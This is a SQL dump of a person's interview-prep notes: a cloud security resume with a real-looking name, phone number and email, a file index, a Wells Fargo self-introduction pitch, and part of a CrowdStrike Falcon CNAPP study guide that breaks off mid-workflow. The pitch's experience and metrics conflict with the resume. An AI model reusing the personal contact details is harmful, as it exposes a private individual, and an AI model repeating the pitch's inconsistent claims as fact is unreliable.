VALUES ($VELSEC$GopiKrishna_Resume_HSBC_CloudSecurity$VELSEC$, $VELSEC$Gopikrishna Resume Hsbc Cloudsecurity$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$# **GOPIKRISHNA VALLEPU**

**Hyderabad, Telangana – 500084**
📞 +91 9160216468 | ✉️ gopikrishnavallepu1998@gmail.com | [LinkedIn](https://linkedin.com/in/gopikrishna-vallepu)

---

## Professional Summary

Cloud & Container Security Engineer with **4+ years** of hands-on cybersecurity experience, specializing in **CrowdStrike Falcon CNAPP**, **AWS cloud security**, and **Kubernetes runtime protection**. Currently operating as a Security Analyst focused on cloud workload protection (CWPP), cloud security posture management (CSPM), and container security across enterprise AWS and EKS environments. Proficient in **detection engineering, security agent lifecycle management, and compliance evidence generation** against CIS AWS Foundations Benchmark. Experienced in triaging runtime detections — including container escape attempts, privilege escalation, drift events, and IAM anomalies — using eBPF-based telemetry from Falcon sensors deployed via DaemonSets. Proven ability to build security dashboards, reduce false positive rates through systematic tuning, and collaborate across platform, engineering, and SOC teams to resolve incidents within defined SLAs.

---

## Core Competencies

| Domain | Skills |
|--------|--------|
| **CNAPP & Cloud Security** | CrowdStrike Falcon (CWPP, CSPM, CIEM, KAC), Cloud-native security architecture, CNAPP design |
| **Runtime Protection** | Container drift detection/prevention, interactive session detection, kernel exploit detection, eBPF telemetry |
| **Kubernetes Security** | EKS, Kubernetes Admission Controller (KAC), RBAC auditing, Pod Security Standards, DaemonSet sensor deployment |
| **AWS Security** | IAM, EC2, S3, EKS, VPC, KMS, GuardDuty, CloudTrail, CloudWatch, Secrets Manager, IRSA |
| **Detection Engineering** | Custom detection rule building, false positive tuning, alert correlation, MITRE ATT&CK cloud mapping |
| **Monitoring & Reporting** | Security dashboards, coverage metrics, sensor health validation, detection accuracy tracking |
| **Governance & Compliance** | CIS AWS/EKS Benchmarks, audit evidence generation, change management, SLA enforcement |
| **Incident Response** | Alert triage, root cause analysis, containment workflows, threat hunting, log correlation |
| **Tools & Platforms** | SecureWorks Taegis XDR, CrowdStrike Falcon EDR, Zscaler, Tenable Nessus, Python, Bash, Linux |

---

## Professional Experience

### **UltraViolet Cyber** — Security Analyst
📍 Hyderabad, Telangana | 📅 January 2023 – Present

#### Endpoint Security for Cloud & Containers
- Managed and configured **CrowdStrike Falcon** across AWS EC2, Linux workloads, and **EKS Kubernetes clusters**, ensuring consistent runtime protection and endpoint visibility across cloud-native environments.
- Validated and maintained **Falcon sensor deployment on EKS worker nodes** via DaemonSets, achieving **100% cluster-wide sensor coverage** and ensuring automated enrollment for new nodes in managed node groups.
- Executed **sensor onboarding, health validation, and decommissioning** procedures during workload provisioning and scale-down events, maintaining complete detection visibility with zero telemetry gaps.

#### Detection Engineering & Runtime Protection
- Triaged and investigated **runtime detections** including suspicious process execution, privilege escalation attempts, container drift events, abnormal network activity, and unauthorized interactive shell access within containerized workloads.
- Performed **detection reviews and false positive tuning** using SecureWorks Taegis XDR and CrowdStrike Falcon, analyzing true positive rates monthly and suppressing known false-positive patterns with documented justification and expiry dates.
- Built **custom detection correlation logic** to reduce alert fatigue — combining low-signal events (e.g., first-seen domain connections) with process chain anomalies to surface high-confidence alerts, improving SOC response efficiency.
- Investigated multi-stage attack patterns including: **container escape attempts via nsenter/hostPID**, **IMDS credential theft via SSRF**, **IAM privilege escalation via CreatePolicyVersion**, and **S3 data exfiltration via presigned URL abuse**.

#### Cloud Security Posture & Governance (CSPM / CIEM)
- Proactively monitored AWS environments for **high-risk misconfigurations** including publicly exposed S3 buckets, overly permissive IAM policies, open security groups (port 10250, 0.0.0.0/0), and missing encryption controls.
- Conducted **granular IAM access reviews** to enforce least privilege principles, identifying shadow admin paths, over-privileged instance profiles, and IRSA roles missing `aws:SourceVpc` conditions — reducing privilege escalation risk surface.
- Identified and remediated **configuration drift** from baseline security standards, ensuring adherence to internal governance policies and CIS AWS Foundations Benchmark.
- **Generated audit evidence** aligned with CIS AWS and EKS Benchmarks, supporting compliance and regulatory readiness for audit cycles — producing reports on S3 access controls, CloudTrail status, IAM policy reviews, and sensor coverage metrics.

#### Kubernetes Admission Control (KAC)
- Supported **Falcon KAC policy configuration** to enforce admission controls on EKS clusters — policies covering privileged container blocking, root container prevention, host namespace restrictions, and image assessment enforcement.
- Monitored KAC **Indicators of Misconfiguration (IOMs)** including: privileged containers, running as root, hostPID/hostNetwork/hostIPC enabled, excessive capabilities, and sensitive volume mounts.
- Contributed to **staged KAC rollout strategy**: Alert-only mode for 2 weeks → selective prevention for critical IOMs → full PREVENT mode after 72-hour clean detection runs — achieving zero false-positive production blocks.

#### Monitoring, Dashboards & Reporting
- Defined and maintained **operational dashboards** tracking sensor coverage percentage, detection accuracy rates, false positive trends, and container asset counts across clusters.
- Monitored **container inventory** — total containers, pods, nodes, and clusters — and investigated anomalies such as unidentified containers not visible to Kubernetes (indicating compromised node/orchestrator).
- Created **weekly and monthly reports** for stakeholders including detection volume, mean-time-to-triage, coverage gaps, and remediation SLA compliance metrics.

#### Collaboration & Incident Support
- Performed **log correlation and threat analysis** across AWS CloudTrail, GuardDuty, Falcon EDR, Microsoft security logs, Zscaler, authentication logs, process execution logs, and NetFlow telemetry to identify IOCs and lateral movement patterns.
- Collaborated with **cloud platform teams and application owners** to resolve security findings, ensuring timely remediation within SLA — CRITICAL: 24 hours, HIGH: 48 hours, MEDIUM: 7 days.
- Supported **incident response workflows** for cloud and container security events — executing containment (pod quarantine via NetworkPolicy, node cordon/drain), credential rotation, and post-incident root cause analysis.

---

### **Cisco Systems, Inc** — Consulting Engineer Apprentice
📍 Bangalore, Karnataka | 📅 July 2021 – July 2022

- Developed a **Firewall Migration Tool** using Python, parsing ASA/FTD configuration files and automating migration steps, reducing manual migration effort by 60%.
- Performed **bug scrubbing** for Cisco ASA and FTD platforms, analyzing defects and providing software recommendation reports to enterprise customers.
- Contributed to **application containerization initiatives** using Docker and supported basic Kubernetes configurations, building foundational experience in container orchestration and secure infrastructure practices.

---

## Key Projects & Scenarios Handled

| Scenario | My Role | Outcome |
|----------|---------|---------|
| Container drift — offensive tool injection post-RCE | Triaged drift alert, correlated with process tree, identified RCE vector | Containment in <15 min, drift prevention switched to PREVENT mode |
| IMDS v1 credential theft via SSRF | Investigated CloudTrail + Falcon CWPP telemetry, traced stolen session | IMDSv2 enforced org-wide via SCP, CSPM policy created |
| Privileged container escape via hostPID + nsenter | Detected container escape pattern in Falcon process tree | Node cordoned, replaced; KAC policy tightened to PREVENT |
| EKS RBAC misconfig — system:masters in aws-auth | Identified during CSPM audit of aws-auth ConfigMap | Custom ClusterRole created, system:masters mapping removed |
| kubectl exec abuse from leaked kubeconfig | Investigated interactive session alert in production pod | SA token rotated, exec RBAC removed, secrets moved to Secrets Manager |

---

## Technical Skills

| Category | Technologies |
|----------|-------------|
| **Security Platforms** | CrowdStrike Falcon (EDR, CWPP, CSPM, CIEM, KAC), SecureWorks Taegis XDR, Zscaler, Tenable Nessus |
| **Cloud (AWS)** | IAM, EC2, S3, EKS, VPC, KMS, GuardDuty, CloudTrail, CloudWatch, Secrets Manager, Route 53, IRSA, SCP |
| **Kubernetes** | EKS, kubectl, RBAC, DaemonSets, Admission Controllers, Pod Security Standards, Helm, Namespaces |
| **Containerization** | Docker, containerd, image assessment, container drift detection, runtime protection |
| **Detection & Response** | MITRE ATT&CK (Cloud Matrix), IOA/IOM/IOC analysis, threat hunting, log correlation, incident response |
| **Compliance** | CIS AWS Foundations Benchmark, CIS EKS Benchmark, CIS Kubernetes Benchmark, audit evidence generation |
| **Scripting & Tools** | Python, Bash, Regex, Linux, Wireshark, CyberChef |
| **Protocols** | TCP/IP, DNS, HTTP/HTTPS, TLS, OIDC |

---

## Certifications

| Certification | Issuer |
|--------------|--------|
| CCNA 200-301 | Cisco |
| CyberOps Associate | Cisco |
| AWS Cloud Essentials | Amazon Web Services |

---

## Education

**PSCMR College of Engineering and Technology** — Vijayawada, Andhra Pradesh
Bachelor of Technology in Electronics and Communication Engineering
📅 July 2016 – May 2020$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$INDEX$VELSEC$, $VELSEC$Index$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$﻿# Interview Preparation

Index of files in this directory:

- [DIRECTORY_INDEX.md](./DIRECTORY_INDEX.md)
- [Interview_Prep_merged.pdf](./Interview_Prep_merged.pdf)
- [Cloud_Security_HR_Interview_Top20.md](./General_Interview/Cloud_Security_HR_Interview_Top20.md)
- [Cloud_Security_Mock_Interview.md](./General_Interview/Cloud_Security_Mock_Interview.md)
- [Self_Intro.md](./General_Interview/Self_Intro.md)
- [Ultimate_Interview_Prep_Part1.md](./General_Interview/Ultimate_Interview_Prep_Part1.md)
- [Ultimate_Interview_Prep_Part2.md](./General_Interview/Ultimate_Interview_Prep_Part2.md)
- [GopiKrishna_Resume_HSBC_CloudSecurity.md](./Resume/GopiKrishna_Resume_HSBC_CloudSecurity.md)
- [WellsFargo_JD_Coverage_Analysis.md](./WellsFargo_Prep/WellsFargo_JD_Coverage_Analysis.md)
- [WF_Gap_Notes_Part1_PowerBI_Excel.md](./WellsFargo_Prep/WF_Gap_Notes_Part1_PowerBI_Excel.md)
- [WF_Gap_Notes_Part2_ServiceNow_SQL_Splunk.md](./WellsFargo_Prep/WF_Gap_Notes_Part2_ServiceNow_SQL_Splunk.md)
- [WF_Gap_Notes_Part3_Azure_GCP_Wiz.md](./WellsFargo_Prep/WF_Gap_Notes_Part3_Azure_GCP_Wiz.md)
- [WF_Interview_Pitch.md](./WellsFargo_Prep/WF_Interview_Pitch.md)
- [WF_Interview_PowerBI_SQL_Excel.md](./WellsFargo_Prep/WF_Interview_PowerBI_SQL_Excel.md)
- [WF_Learning_Resources_Guide.md](./WellsFargo_Prep/WF_Learning_Resources_Guide.md)
- [WF_Senior_InfoSec_Mock_Interview_Guide.md](./WellsFargo_Prep/WF_Senior_InfoSec_Mock_Interview_Guide.md)
- [WF_Senior_InfoSec_Part4_AppSec.md](./WellsFargo_Prep/WF_Senior_InfoSec_Part4_AppSec.md)
- [WF_Senior_InfoSec_Part5_CloudSec.md](./WellsFargo_Prep/WF_Senior_InfoSec_Part5_CloudSec.md)
- [WF_Senior_InfoSec_Part6_GRC.md](./WellsFargo_Prep/WF_Senior_InfoSec_Part6_GRC.md)
- [WF_Senior_InfoSec_Part7_IRSOC.md](./WellsFargo_Prep/WF_Senior_InfoSec_Part7_IRSOC.md)
- [WF_Senior_InfoSec_Part8_Architecture.md](./WellsFargo_Prep/WF_Senior_InfoSec_Part8_Architecture.md)
- [WF_VM_Self_Intro_Pitch.md](./WellsFargo_Prep/WF_VM_Self_Intro_Pitch.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Self_Intro$VELSEC$, $VELSEC$Self Intro$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$# 🎤 Self‑Introduction for Senior Information Security Analyst (Wells Fargo)

**Name:** Gopi Krishna [Last Name]
**Title:** Senior Information Security Analyst – Findings Management (CNAPP)

---

## 1️⃣ QUICK OVERVIEW (30‑45 seconds)

> "I’m a cloud‑focused security analyst with 5 years of experience building and operating findings‑management programs for large‑scale Azure and GCP environments. In my most recent role I owned the end‑to‑end lifecycle of security findings – from detection in a CNAPP platform (Wiz) through triage, remediation, and reporting – handling up to 2,000 active findings across 150 cloud accounts. I combine deep security knowledge with data‑analytics expertise (Power BI, DAX, Power Query, SQL) to turn raw alerts into actionable, measurable insights for both engineers and leadership."

---

## 2️⃣ DAY‑TO‑DAY ACTIVITIES (2 minutes)

### Morning – **Triage & Prioritisation**
- Open **CNAPP console**, **Power BI dashboard**, and **ServiceNow**.
- Review overnight Critical/High findings (5‑15 new daily).
- Perform quick triage: true‑positive check, resource status, internet‑facing flag, existing ticket lookup.
- Create or update ServiceNow tickets, auto‑populate owner/assignment via CMDB lookup, set SLA based on severity + exposure.
- Document false‑positives with justification and 90‑day expiry.

### Mid‑day – **Data Analysis & Reporting**
- Use **Power BI** (DAX measures: SLA compliance, MTTR, finding trends) to answer leadership queries.
- Run **Power Query** merges: Wiz findings ↔ CMDB assets ↔ ServiceNow tickets.
- Perform CMDB validation: identify orphaned cloud assets and stale CI entries.
- Export clean data for ad‑hoc analysis in **Excel** (pivot tables, VLOOKUP/XLOOKUP).

### Afternoon – **Collaboration & Follow‑up**
- Send SLA‑threshold reminders (75 % → email, 100 % → escalation).
- Prepare material for the weekly **remediation office hour** – filtered view of each team’s open findings, recurring patterns, and bulk‑remediation guides.
- Handle exception requests: risk‑acceptance documentation, manager approval, 90‑day expiry.
- If a critical CVE or zero‑day emerges, run an impact assessment, create focused reports, and coordinate emergency tickets and patching.

---

## 3️⃣ WEEKLY RHYTHM (high‑level)
- **Monday:** Refresh Power BI data, run data‑quality checks, publish SLA compliance report.
- **Tue‑Wed:** Deep dive remediation support – validate fixes, close tickets, process exceptions.
- **Thursday:** Host **office hour**; educate teams; publish KB articles on common misconfigurations.
- **Friday:** Review false‑positive rates, tune detection rules, update SOPs and documentation.

---

## 4️⃣ KEY RESPONSIBILITIES & REMEDIATION CYCLE
1. **Detection** – Continuous CSPM/CWPP scans via Wiz; ensure coverage across all cloud accounts.
2. **Triage** – Rapid validation, owner mapping (CMDB), ticket creation (ServiceNow).
3. **Prioritisation** – Severity + exposure matrix; critical internet‑facing findings auto‑escalate.
4. **Remediation** – Guide owners, provide step‑by‑step playbooks, verify fixes, close findings.
5. **Metrics & Reporting** – Power BI dashboards for SLA, MTTR, finding velocity; weekly leadership briefings.
6. **Continuous Improvement** – FP analysis, rule tuning, CMDB hygiene, automation of repetitive tasks.

---

## 5️⃣ QUICK‑PITCH CLOSING (15‑20 seconds)

> "My blend of security expertise, data‑analytics skills, and disciplined operations has consistently improved our security posture – SLA compliance rose from 62 % to 91 %, reporting time dropped from 3 hours to 10 minutes, and our CMDB coverage increased to 97 %. I’m excited to bring that same measurable impact to Wells Fargo’s Findings Management team."

---

*Feel free to adjust the name, years of experience, or any metric to match your actual background.*$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Ultimate_Interview_Prep_Part1$VELSEC$, $VELSEC$Ultimate Interview Prep Part1$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$# 🎯 ULTIMATE CLOUD SECURITY INTERVIEW PREPARATION GUIDE
## Part 1 — Falcon Platform Mastery: Every Workflow, Every Module, Identification → Post-Incident

> **Gopikrishna Vallepu** | Application Security / Cloud Security Engineer
> Tailored for: EY India — CNAPP, CWPP, CSPM, Vulnerability Management, Multi-Cloud Security
> Covers: CrowdStrike Falcon Cloud Security + Orca/Wiz/Prisma equivalents + AWS/Azure/GCP

---

# SECTION 1: YOUR ROLE AT EY — RESPONSIBILITIES MAPPED TO SKILLS

> Everything in this guide maps back to what EY actually expects you to do.

```
EY JD RESPONSIBILITY                          WHERE TO FIND IT IN THIS GUIDE
─────────────────────────────────────────────────────────────────────────────
Leverage CNAPP/CWPP/CSPM to monitor          → Section 2 (Platform Deep Dive)
  cloud assets for vulnerabilities              Section 3 (Every Module Workflow)
  and configuration weaknesses                  Section 4 (Incident Scenarios)

Implement cloud security controls            → Section 3.2 (CSPM Policy Workflows)
  (out-of-box and custom) ensuring              Section 6 (CIS/NIST Compliance)
  compliance with industry standards

Investigate false positives and handle       → Section 5 (FP/TP Investigation)
  risk-acceptance or risk-rating                Section 4 (Scenario Investigations)
  adjustments

Shape remediation SLAs, build-breaking       → Section 3.5 (SLA Framework)
  policies, and enforcement guardrails          Section 3.7 (Build-Breaking Policies)

Respond to zero-day events, iterate          → Section 4.7 (Zero-Day Scenario)
  through vulnerability management              Section 3.1 (Vuln Mgmt Lifecycle)
  lifecycle

Tune scanning tools with Engineering         → Section 5 (Detection Tuning)
  platform team to improve visibility           Section 3.6 (Tool Tuning Workflows)

Identify opportunities for automation        → Section 7 (Automation Playbook)

Deep knowledge of AWS, Azure, or GCP         → Section 2.4 (Multi-Cloud Controls)
  cloud security services                       Section 6 (Cloud-Specific CIS/NIST)
```

---

# SECTION 2: FALCON CLOUD SECURITY PLATFORM — COMPLETE DEEP DIVE

## 2.1 Platform Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    CROWDSTRIKE FALCON CLOUD SECURITY                     │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                     FALCON CLOUD (SaaS Backend)                  │    │
│  │  • AI/ML threat analysis    • Threat Intelligence               │    │
│  │  • Process Intelligence Graph  • Cloud Security Analytics       │    │
│  └─────────────────────────┬───────────────────────────────────────┘    │
│                            │                                            │
│           ┌────────────────┼────────────────┐                          │
│           │                │                │                          │
│  ┌────────▼────────┐  ┌───▼────────┐  ┌───▼──────────────┐           │
│  │  AGENT-BASED     │  │  AGENTLESS  │  │  CLOUD API-BASED │           │
│  │                  │  │             │  │                  │           │
│  │  Falcon Sensor   │  │  Snapshot   │  │  Cloud Account   │           │
│  │  (eBPF DaemonSet)│  │  Scanning   │  │  Registration    │           │
│  │  → Runtime       │  │  → Vuln     │  │  → CSPM via      │           │
│  │    detection     │  │    scanning │  │    API polling    │           │
│  │  → Process trees │  │    without  │  │  → IAM analysis  │           │
│  │  → Network       │  │    agents   │  │  → Config audit  │           │
│  │    telemetry     │  │             │  │                  │           │
│  │  → Drift detect  │  │             │  │                  │           │
│  │                  │  │             │  │                  │           │
│  │  KAC (Admission  │  │             │  │                  │           │
│  │   Controller)    │  │             │  │                  │           │
│  │  → Pre-deploy    │  │             │  │                  │           │
│  │    policy gate   │  │             │  │                  │           │
│  └──────────────────┘  └─────────────┘  └──────────────────┘           │
│                                                                         │
│  MODULES:                                                               │
│  ┌──────┐ ┌──────┐ ┌──────┐ ┌─────┐ ┌──────┐ ┌──────┐ ┌──────────┐  │
│  │CWPP  │ │CSPM  │ │CIEM  │ │KAC  │ │DSPM  │ │AI-SPM│ │ASPM      │  │
│  │      │ │      │ │      │ │     │ │      │ │      │ │          │  │
│  │Work- │ │Post- │ │Ident-│ │K8s  │ │Data  │ │AI/ML │ │App       │  │
│  │load  │ │ure   │ │ity   │ │Gate │ │Sec.  │ │Sec.  │ │Security  │  │
│  │Prot. │ │Mgmt  │ │Mgmt  │ │     │ │Post. │ │Post. │ │Posture   │  │
│  └──────┘ └──────┘ └──────┘ └─────┘ └──────┘ └──────┘ └──────────┘  │
└─────────────────────────────────────────────────────────────────────────┘
```

## 2.2 Console Navigation — Complete Menu Map with Actions

### How to Navigate to Every Feature

```
FALCON CONSOLE LEFT MENU:

Cloud Security
│
├── 📊 Dashboards
│   │   WHAT: Overview of entire cloud security posture
│   │   WHEN TO USE: Daily check-in, executive reporting, trend analysis
│   │   HOW TO ANALYZE: Check posture score trend (dropping = new misconfigs),
│   │                   compliance percentage, active detections count
│   │
│   ├── Posture Score (0-100)
│   │   → Score dropping? → Go to Posture and Compliance → find new IOMs
│   ├── Compliance Score per framework
│   │   → Below 95%? → Pull compliance report → identify failing controls
│   ├── Active Detections by severity
│   │   → Critical/High present? → Go to Detections → investigate immediately
│   ├── Asset Trends (7/30-day)
│   │   → Unexpected spike in containers? → Possible unauthorized deployment
│   └── Sensor Coverage %
│       → Below 100%? → Go to Host Management → find unmonitored nodes
│
├── 🖥️ Assets
│   │   WHAT: Inventory of all cloud resources under protection
│   │   WHEN TO USE: Identifying coverage gaps, asset owners, resource attributes
│   │
│   ├── Cloud Accounts (registered AWS/Azure/GCP accounts)
│   ├── Kubernetes Clusters (cluster name, version, node count, coverage)
│   ├── Containers (ID, image, pod, namespace, sensor status)
│   ├── Pods (name, namespace, labels, node, cluster)
│   └── Nodes (instance ID, OS, external IP, cluster association)
│
├── 🛡️ Posture and Compliance
│   │   WHAT: Configuration auditing and compliance enforcement
│   │   WHEN TO USE: Finding misconfigurations, compliance reporting, audit prep
│   │
│   ├── Cloud security posture
│   │   ├── Compliance
│   │   │   WHAT: Posture against selected compliance frameworks
│   │   │   HOW TO USE: Select framework (CIS AWS, NIST 800-53, SOC2, HIPAA)
│   │   │   → View pass/fail per control → drill into failing controls
│   │   │   → Export PDF for auditors
│   │   │
│   │   ├── Cloud Risks ◄── CRITICAL FEATURE
│   │   │   WHAT: Unified attack paths combining IOMs + IOAs + vulnerabilities
│   │   │   HOW TO USE: Review attack paths sorted by risk score (0-100)
│   │   │   → Each path shows: entry point → pivot → target → blast radius
│   │   │   → Prioritize remediation by path score, not individual findings
│   │   │   WHEN: Weekly risk review, remediation prioritization meetings
│   │   │
│   │   ├── Indicators of Misconfiguration (IOM)
│   │   │   WHAT: Individual cloud misconfigurations
│   │   │   HOW TO ANALYZE:
│   │   │     1. Filter by severity (Critical → High → Medium)
│   │   │     2. Filter by cloud account or resource type
│   │   │     3. Click finding → see affected resource, remediation steps
│   │   │     4. Check: Is this already assigned? What's the SLA status?
│   │   │   ACTIONS: Assign to owner, set SLA, suppress (with justification)
│   │   │
│   │   ├── Infrastructure as Code (IaC) detections
│   │   │   WHAT: Misconfigurations in Terraform/CloudFormation templates
│   │   │   WHEN: Shift-left — catch issues before deployment
│   │   │
│   │   └── Kubernetes misconfigurations
│   │       WHAT: K8s-specific IOMs (privileged pods, host mounts, etc.)
│   │
│   └── Explorer ◄── ASSET GRAPH VISUALIZATION
│       WHAT: Visual graph showing relationships between cloud resources
│       HOW TO USE: Click asset → see connections (IAM roles, networks, data)
│       → Identify lateral movement paths visually
│
├── 🔍 Vulnerabilities
│   │   WHAT: CVEs in images, hosts, and cloud workloads
│   │   WHEN TO USE: Vulnerability management lifecycle
│   │
│   ├── Image Assessments
│   │   WHAT: CVE and malware scan results for container images
│   │   HOW TO ANALYZE:
│   │     1. Sort by highest severity CVEs
│   │     2. Filter by "running in production" vs "registry only"
│   │     3. Check: Is there a fix available? What version patches it?
│   │     4. Prioritize: Running images with Critical CVEs + public exploit
│   │   ACTIONS: Create ticket for image rebuild, block via KAC if exploitable
│   │
│   └── Agentless Vulnerability Scanning
│       WHAT: Snapshot-based scanning for workloads without agents
│       WHEN: Serverless, managed services, or temporary environments
│       HOW: Reads EBS/disk snapshots → identifies CVEs without agent install
│
├── 🚨 Detections
│   │   WHAT: Active security detections (IOAs = behavioral, IOMs = config)
│   │   WHEN TO USE: Real-time incident investigation
│   │   THIS IS WHERE YOU SPEND MOST TIME DURING AN INCIDENT
│   │
│   ├── Containers Indicators of Attack (IOA)
│   │   WHAT: Runtime behavioral detections inside containers
│   │   HOW TO INVESTIGATE (step-by-step below in Section 3.3)
│   │   EXAMPLES: Reverse shell, container drift, privilege escalation,
│   │             interactive intrusion, C2 beacon, DNS tunneling
│   │
│   ├── Dynamic Container Assessments
│   │   WHAT: Continuous assessment of running containers
│   │
│   ├── Investigate Container Network
│   │   WHAT: Network flow visualization for containers
│   │   HOW TO USE: Select container → see all connections (internal + external)
│   │   → Identify suspicious outbound or lateral connections
│   │
│   └── Image Assessments (runtime view)
│       WHAT: Assessment status of images currently running in clusters
│
├── ⚙️ Rules and Policies
│   │   WHAT: Configure detection rules and prevention policies
│   │   WHEN TO USE: Tuning, new policy deployment, exception management
│   │
│   ├── Policies
│   │   ├── Indicators of Attack (IOA) policies
│   │   │   ACTIONS: Enable/disable specific IOA rules, set severity
│   │   │
│   │   ├── Admission Control policies ◄── KAC CONFIGURATION
│   │   │   HOW TO CONFIGURE:
│   │   │     1. Create policy → assign to cluster (via Host Group)
│   │   │     2. Add IOM rules → set action per rule (Alert or Prevent)
│   │   │     3. Add Image Assessment rules → block unscanned images
│   │   │     4. Scope by namespace and labels
│   │   │   ROLLOUT: Alert-only for 2 weeks → Prevent for critical rules
│   │   │
│   │   ├── Image Assessment policies
│   │   │   ACTIONS: Set thresholds (block Critical CVEs, block malware)
│   │   │
│   │   ├── Container drift exclusions
│   │   │   WHEN: Known legitimate processes that trigger drift alerts
│   │   │   CAUTION: Every exclusion must be documented with business justification
│   │   │
│   │   └── Cloud Risks rules / IOM rules / IaC rules
│   │       ACTIONS: Customize severity, enable/disable specific checks
│   │
│   ├── Policies Management
│   │   WHAT: Overview of all policies, their assignments, and status
│   │
│   └── Suppression rules
│       WHAT: Rules to suppress known false positives
│       REQUIREMENTS: Each suppression must have:
│         • Documented justification
│         • Expiry date (max 90 days)
│         • Assigned reviewer
│         • Quarterly review
│
├── ⚡ Settings
│   │
│   ├── Cloud posture scan settings
│   │   WHAT: Configure scan frequency, scope, and cloud provider connections
│   │
│   ├── 1-Click Sensor Deployment
│   │   WHAT: Simplified sensor enrollment for cloud workloads
│   │   HOW: Select cloud provider → follow wizard → sensor auto-deploys
│   │
│   ├── Account Registration
│   │   WHAT: Register new AWS/Azure/GCP accounts for monitoring
│   │   HOW: Use CloudFormation stack (AWS), ARM template (Azure), or Terraform
│   │
│   └── Image Assessment settings
│       WHAT: Configure which registries to scan, scan frequency
│
└── 🔌 Integrations
    WHAT: Connect Falcon to SIEM, ticketing, notification systems
    EXAMPLES: Splunk, Sentinel, Jira, ServiceNow, PagerDuty, Slack
```

## 2.3 Equivalent Features Across CNAPP Tools

> EY may use Orca, Wiz, or Prisma Cloud — know the equivalents.

| Capability | CrowdStrike Falcon | Orca Security | Wiz | Prisma Cloud |
|-----------|-------------------|---------------|-----|-------------|
| **Runtime Protection** | CWPP (eBPF sensor) | Agentless runtime | Agentless runtime | Prisma Defender (agent) |
| **Config Audit** | CSPM (Horizon) | CSPM | CSPM | CSPM |
| **Identity Analysis** | CIEM | CIEM | CIEM | CIEM |
| **K8s Admission** | KAC | OPA integration | Admission controller | Admission controller |
| **Image Scanning** | Image Assessment | Image scanning | Image scanning | twistcli + Defender |
| **IaC Scanning** | IaC rules | IaC scanning | IaC scanning | Checkov/Bridgecrew |
| **Attack Path** | Cloud Risks | Attack Path Analysis | Attack Path | Attack Path |
| **Data Security** | DSPM | Data security | DSPM | Enterprise DSPM |
| **Deployment** | Agent (DaemonSet) + Agentless | 100% Agentless | 100% Agentless | Agent + Agentless |

## 2.4 Multi-Cloud Security Controls Matrix

| Control | AWS | Azure | GCP |
|---------|-----|-------|-----|
| **Guardrails** | SCPs (Service Control Policies) | Azure Policies + Management Groups | Organization Policies |
| **IAM Monitoring** | CloudTrail + IAM Access Analyzer | Azure AD Sign-in Logs + Sentinel | Cloud Audit Logs + SCC |
| **Network Security** | Security Groups + NACLs + VPC Flow Logs | NSGs + Azure Firewall + Flow Logs | Firewall Rules + VPC Flow Logs |
| **Encryption** | KMS (CMK/AWS-managed) | Key Vault + CMK | Cloud KMS + CMEK |
| **Credential Detection** | GuardDuty + CNAPP | Defender for Cloud + Sentinel | SCC + CNAPP |
| **Compliance** | Security Hub + AWS Config | Defender Compliance + Regulatory | SCC Compliance |
| **Container Security** | ECR scanning + EKS integration | ACR scanning + AKS integration | Artifact Analysis + GKE |

---

# SECTION 3: EVERY MODULE WORKFLOW — FROM START TO FINISH

## 3.1 Vulnerability Management Lifecycle — Platform Workflow

```
COMPLETE WORKFLOW IN FALCON + CNAPP:

PHASE 1: DISCOVER
├── WHERE IN CONSOLE: Vulnerabilities → Image Assessments + Agentless Scanning
├── WHAT TO DO:
│   ├── Review new CVEs discovered in last 24/48 hours
│   ├── Filter: Severity = Critical/High, Running = Yes (in production)
│   ├── Check: Is a public exploit available? (CISA KEV catalog, EPSS score)
│   └── Export: List of affected assets with CVE details
│
PHASE 2: ASSESS & VALIDATE
├── WHERE IN CONSOLE: Click specific CVE → view affected resources
├── WHAT TO DO:
│   ├── Is the vulnerable library actually loaded at runtime?
│   │   (Some CVEs affect packages that are installed but not used)
│   ├── Is the vulnerable port/service exposed to the internet?
│   ├── Does the asset process sensitive data? (Check DSPM classification)
│   └── What is the CNAPP's contextual risk score? (Not just CVSS)
│
PHASE 3: PRIORITIZE
├── WHERE IN CONSOLE: Cloud Risks → Attack Path view
├── WHAT TO DO:
│   ├── View attack paths that include this CVE
│   ├── Score = Exploitability × Exposure × Data Sensitivity × Blast Radius
│   ├── Critical CVE + public-facing + PII data + admin IAM = IMMEDIATE
│   ├── Critical CVE + internal-only + no sensitive data = HIGH (48h SLA)
│   └── Create risk-ranked remediation queue
│
PHASE 4: REMEDIATE
├── WHERE: Jira/ServiceNow tickets (auto-created via integration)
├── WHAT TO DO:
│   ├── Assign to asset owner with specific remediation steps
│   ├── For container images: rebuild image with patched base
│   ├── For EC2/VMs: patch via SSM Run Command or maintenance window
│   ├── For Lambda: update dependency layer
│   ├── If no patch available: apply compensating controls (WAF, SG restriction)
│   └── Track against SLA timers
│
PHASE 5: VERIFY
├── WHERE IN CONSOLE: Vulnerabilities → re-scan after remediation
├── WHAT TO DO:
│   ├── Trigger re-scan of remediated assets
│   ├── Confirm CVE no longer present
│   ├── Close the ticket only after verified
│   └── If CVE still present: escalate back to asset owner
│
PHASE 6: REPORT
├── WHERE: Dashboards + exported reports
